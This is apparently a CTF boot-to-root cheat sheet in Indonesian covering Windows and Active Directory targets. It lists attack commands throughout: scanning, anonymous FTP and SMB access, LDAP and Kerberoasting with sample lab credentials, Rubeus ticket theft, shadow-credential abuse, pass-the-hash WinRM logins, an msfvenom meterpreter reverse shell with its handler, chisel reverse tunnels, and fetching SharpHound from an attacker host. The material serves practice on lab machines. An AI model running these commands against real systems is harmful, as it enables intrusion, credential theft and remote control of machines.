# Template proses main CTF boot to root (Windows)

![img](https://raw.githubusercontent.com/Tomba-Hopkins/Warung-Sidi/refs/heads/main/img/menu/3.jpg)

# Links
- dah buat versi UI nya 
- github: https://github.com/zams-putra/b2r-framework
- webnya: https://b2r-framework.vercel.app/

# Foothold

- ini adalah template2 ku buat main ctf b2r
- kedepannya akan ku update selalu

## Scanning Service with nmap
- cek tcp
```bash
nmap -sCV --min-rate 1000 [ip] -vv -oN scan.nmap -p-
```

- cek udp
```bash
nmap -sU --min-rate 1000 [ip] -vv -oN scan_udp.nmap -p- 
```

- kalau ip gabisa di ping 
```bash
nmap -sCV --min-rate 1000 [ip] -vv -oN scan.nmap -p- -Pn
```


## FTP check
kalau anonymous di FTP target nyala
```bash
ftp [ip] 21
[login with: Anonymous:Anonymous]
```
- check file di ftp, kali aja ada file penting dan download aja
```bash
get [namafile.ekstensi]
```

## Fuzzing directory
ini dipakai kalau ip ada service web nya
- with gobuster
```bash
gobuster dir -u http://[ip] -w ~/wordlists/seclists/web-content/common.txt | tee dir.txt
```
- with dirsearch (kalau gobuster gabisa)
```bash
dirsearch -u http://[ip] -w ~/wordlists/seclists/web-content/common.txt
```

## Fuzzing Subdomain
kali aja web nya pakai domain misal http://nasgor.jmk
- with gobuster
```bash
gobuster vhost -u nasgor.jmk -w ~/wordlists/seclists/dns/subdomains-top1million-5000.txt --append-domain | tee subdo.txt
```
- with ffuf
```bash
ffuf -u "http://nasgor.jmk" -H "HOST: FUZZ.nasgor.jmk" -w ~/wordlists/seclists/dns/subdomains-top1million-5000.txt  -fw 522
```
- kalau response nya banyak (false positive, filter length nya)
```bash
ffuf -u "http://nasgor.jmk" -H "HOST: FUZZ.nasgor.jmk" -w ~/wordlists/seclists/dns/subdomains-top1million-5000.txt  -fw (jumlah length nya)
```

## Check Exploit
kali aja webnya vuln sama public Exploit
- check versi di source code nya (ctrl + u) di browser lalu cek2 di comment atau source kali aja ada versi
- kalau ada bisa lanjutkan cari public exploit nya
- di google / exploitdb / github
```txt
cari aja di google: [nama aplikasi] [versi] exploit
contoh keyword: nasgorApp V2.2.9 exploit
```
- di searchsploit 
```bash
searchsploit nasgorApp V2.2.9
```

- di msfconsole
```bash
msfconsole
search nasgorApp V2.2.9
```

## SMB Check 
- cek kalau smb open
- tanpa creds
```bash
nxc smb [ip] --verbose
nxc smb [ip] -u '' -p '' --shares --verbose
nxc smb [ip] -u ' ' -p '' --shares --verbose
smbclient -L \\[ip]
smbclient \\\\ip\\sharesnya
get [namafile.ekstensi]

```

## LDAP Check

### nxc ldap
- cek kalau dapat creds siapa tau bisa LDAP
```bash
nxc ldap [ip] -u '[username]' -p '[passwordnya]'

[kalau ijo bisa cek user2 nya]
nxc ldap [ip] -u '[username]' -p '[passwordnya]' --users
nxc ldap 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users

[bisa cek cek computernya juga]
nxc ldap [ip] -u [username] -p '[passwordnya]' --computers
nxc ldap 10.129.76.74 -u wallace.everette -p 'Welcome2026@' --computers
```
### bloodhound
- kalau ada yang ijo, coba di bloodhound juga bisa
```bash
bloodhound-python -u [username] -p '[passwordnya]' -d [domain.jmk] -ns [ip] -c all
bloodhound (lalu cek masukin semua .json nya)
```
### ldapsearch
- kalau di bloodhound ganemu apa apa bisa pakai ldapsearch
- contohnya field info, di bloodhound susah nemunya
```bash
ldapsearch -x -H ldap://[ip] -D '[domain]\[username]' -w '[password]' -b "DC=[namadomain],DC=[tld]" "(sAMAccountName=[namadomain])"
ldapsearch -x -H ldap://10.129.230.181 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(sAMAccountName=support)"
```

## Kerberoasting Check
- kerberos setup
- bisa time bisa krb5.conf
- setup time 
```bash
sudo ntpdate [ip]

# atau kalau ntp sync nya di block atau gabisa, pakai faketime

faketime "$(ntpdate -q [ip] | cut -d ' ' -f 1,2)"
```

- cek userspns kalau dapet creds misal
```bash
impacket-GetUserSPNs namadomain.domain/user_misal_svc:passwordnya -dc-ip [ip] -request
echo '$krb5tgs$23$*output' > hash.txt
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

### Dapetin delegate TGT dari mesin local
- ini kali aja bisa yakan, coba dulu aja
- upload Rubeus.exe
- dapet dari sini yg uda .exe tanpa build2 
- https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.7_x64
- upload and run aja
```bash
.\Rubeus.exe tgtdeleg /nowrap

[copy base64 nya and masukin ke file]
echo "[base64]" | base64 -d > output.kirbi

[convert biar bisa dipakai certipy]
impacket-ticketConverter output.kirbi output.nya.ccache
```

## Shadow Creds Abuse / Key Creds Link Abuse
### identify
- ini bisa terjadi kalau ada genericwrite
- entah ke user tertentu atau computer tertentu
- bisa cek cek pakai bloodhound
### execute
- kalau pakai TGT
```bash
faketime "$(ntpdate -q [ip] | cut -d ' ' -f 1,2)" certipy-ad shadow auto -k -account [acc yg genericwrite]$ -dc-ip [ip] -dc-host DC01.logging.htb -target DC01.logging.htb
```

## WinRM 
- kalau nemu creds bisa coba2
```bash
evil-winrm -i [ip] -u '[user nya]' -p '[pass nya]'
evil-winrm -i [ip] -u '[user nya]' -H '[kalau ada NTLM hash]'
```

## Command Control / C2
- semisal revshell, kan jelek tuh shellnya
- bikin aja shell pakai msf lebih mendingan
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[ip_listener] LPORT=[port_listener] -f exe -o shell.exe
# upload aja file nya, shell.exe ini

msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST [ip_listener]; set LPORT [port_listener]; run"


# run di target
.\shell.exe
```


# Privilege Escalation

## Pivoting
- ini masih copy dari yg framework linux ku sih hhh, jadi kali ae sama
- cek internal service yg jalan, keknya ada beda dikit ama linux deh
```ps1
netstat -ano | findstr "LISTENING"
```
- ssh port forwarding, ini dipake kalo tau passwordnya atau ga kalo ada id_rsa 
```bash
ssh -L [mau_taruh_diport_mana]:127.0.0.1:[mau_run_port_internal_service_mana] [username_target]@[ip_target]

ssh -L 6060:127.0.0.1:80 cave_man@10.10.10.10 # nanti buka 127.0.0.1:6060 di browsermu jadi port 80 nya mereka
# also kalau ada internal service di 4444, cek di browser juga possible ada
```
- udah sih, keknya kalau dah connect dia bisa cek2 internal service port lain
- chisel port forwarding
```ps1
# di mesin attacker
./chisel server -p [mau_port_mana] --reverse
./chisel server -p 8000 --reverse

# di mesin victim, make sure upload dulu ke mesin target, pake wget kah pake apa aja bebas
# case misal yg jalan internal service port 8888 sama 5000, kalau chisel kudu 2 cuy
.\chisel.exe client [ip_attacker]:[port_reverse] R:[internal_service1]:127.0.0.1:[internal_service1] R:[internal_service2]:127.0.0.1:[internal_service2]
.\chisel.exe client 10.10.10.10:8000 R:5000:127.0.0.1:5000 R:8888:127.0.0.1:8888
# lansgung buka aja port 5000 di browser sama port 8888, 127.0.0.1:8000 127.0.0.1:5000
```

## Check Privilege group etc
```bash
whoami /all
whoami /priv
```
- cek ada impersonate atau ga, atau cek2 lainnya

## Check AD Data
- kumpulin data AD pakai sharphound and bloodhound
```bash
upload SharpHound.ps1 . (kalau lagi ada di evil-winrm)
curl ip:port/SharpHound.ps1 -O SharpHound.ps1
Import-Module .\SharpHound.ps1 
Invoke-BloodHound -CollectionMethod All
download 20260209123721_mesin.zip /home/user_attacker/path/mesin.zip (kalau di evil-winrm)
```
- nanti analysis pakai bloodhound, tinggal drag aja file zip nya

# Under Construction - masih belum selesai ( soon )